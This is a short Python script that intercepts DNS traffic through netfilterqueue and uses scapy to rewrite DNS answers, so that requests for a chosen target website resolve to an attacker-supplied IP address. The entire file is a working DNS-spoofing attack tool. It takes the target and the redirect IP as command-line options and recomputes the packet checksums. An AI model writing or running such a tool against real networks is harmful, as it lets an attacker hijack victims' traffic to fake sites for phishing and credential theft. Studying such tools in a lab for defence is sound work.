#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import optparse
import subprocess


def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "-w", dest="target_website", help="Target Website")
    parser.add_option("-r", "-i", dest="redirect_ip", help="Redirecting IP")
    (options, arguments) = parser.parse_args()
    if not options.target_website:
        parser.error("\n[-] Please specify Target Website\n")
    elif not options.redirect_ip:
        parser.error("[-] Please specify Redirecting IP\n")

    return options


def packet_process(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if target_website in qname:
            print("[+] Spoofing target")
            ans = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
            scapy_packet[scapy.DNS].an = ans
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


options = get_args()
target_website = options.target_website
redirect_ip = options.redirect_ip

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, packet_process)
queue.run()
